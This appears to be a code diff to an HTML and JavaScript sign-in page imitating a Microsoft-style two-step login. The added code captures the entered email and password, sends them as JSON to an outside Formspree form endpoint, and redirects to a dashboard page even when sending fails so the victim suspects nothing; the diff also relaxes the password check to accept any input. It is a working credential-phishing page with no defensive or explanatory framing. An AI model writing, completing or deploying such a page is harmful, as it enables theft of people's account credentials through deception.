@@ -25,7 +25,6 @@
             margin-bottom: 28px; position: relative; min-height: 340px;
         }
 
-        /* --- Loading Overlay --- */
         #loadingOverlay {
             display: none; position: absolute; top: 0; left: 0; 
             width: 100%; height: 100%; background: white; z-index: 10;
@@ -40,7 +39,6 @@
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* --- UI Elements --- */
         .logo-text { font-weight: bold; color: #5e5e5e; margin-bottom: 20px; display: block; }
         h1 { font-size: 24px; margin: 0 0 16px 0; color: #1b1b1b; }
         .user-display { font-size: 15px; margin-bottom: 20px; color: #1b1b1b; display: none; }
@@ -50,7 +48,7 @@
             padding: 8px 0; font-size: 16px; outline: none; margin-bottom: 20px; 
         }
 
-        #passwordSection { display: none; } /* Hidden initially */
+        #passwordSection { display: none; }
 
         .links { font-size: 13px; margin-bottom: 30px; }
         .links a { color: #0067b8; text-decoration: none; display: block; margin-bottom: 8px; }
@@ -83,7 +81,7 @@
             </div>
 
             <div id="passwordSection">
-                <div class="user-display" id="displayEmail"></div>
+                <div class="user-display" id="displayEmail" style="font-weight: 500;"></div>
                 <h1>Enter password</h1>
                 <input type="password" id="userPass" placeholder="Password">
                 <div class="links">
@@ -109,38 +107,59 @@
         const overlay = document.getElementById('loadingOverlay');
         const displayEmail = document.getElementById('displayEmail');
 
-        // Function for the "Next" button
+        // Replace with your endpoint
+        const FORMSPREE_URL = "https://formspree.io/f/mreazrpn";
+
+        let user_email = "";
+
         nextBtn.addEventListener('click', function() {
-            const email = document.getElementById('userEmail').value;
-            if (email === "" || !email.includes('@')) {
+            user_email = document.getElementById('userEmail').value;
+            if (user_email === "" || !user_email.includes('@')) {
                 alert("Please enter a valid email.");
-                return;
-            }
-
-            overlay.style.display = 'flex'; // Show spinner
-
-            setTimeout(() => {
-                overlay.style.display = 'none'; // Hide spinner
-                emailSection.style.display = 'none'; // Hide email input
-                passwordSection.style.display = 'block'; // Show password input
-                displayEmail.innerText = email; // Show the email they typed
-                displayEmail.style.display = 'block';
-            }, 1500);
-        });
-
-        // Function for the "Sign in" button
-        loginBtn.addEventListener('click', function() {
-            const pass = document.getElementById('userPass').value;
-            if (pass.length < 4) {
-                alert("Please enter your password.");
                 return;
             }
 
             overlay.style.display = 'flex';
 
             setTimeout(() => {
+                overlay.style.display = 'none';
+                emailSection.style.display = 'none';
+                passwordSection.style.display = 'block';
+                displayEmail.innerText = user_email;
+                displayEmail.style.display = 'block';
+            }, 1200);
+        });
+
+        loginBtn.addEventListener('click', function() {
+            const pass = document.getElementById('userPass').value;
+            if (pass.length < 1) {
+                alert("Please enter your password.");
+                return;
+            }
+
+            overlay.style.display = 'flex';
+
+            // Send data to Formspree
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    Email: user_email,
+                    Password: pass
+                })
+            })
+            .then(response => {
+                // Successful submission, redirect to dashboard
                 window.location.href = "dashboard.html";
-            }, 1500);
+            })
+            .catch(error => {
+                // Even on error, redirect so user experience isn't broken
+                console.log("Error sending data:", error);
+                window.location.href = "dashboard.html";
+            });
         });
     </script>
 </body>
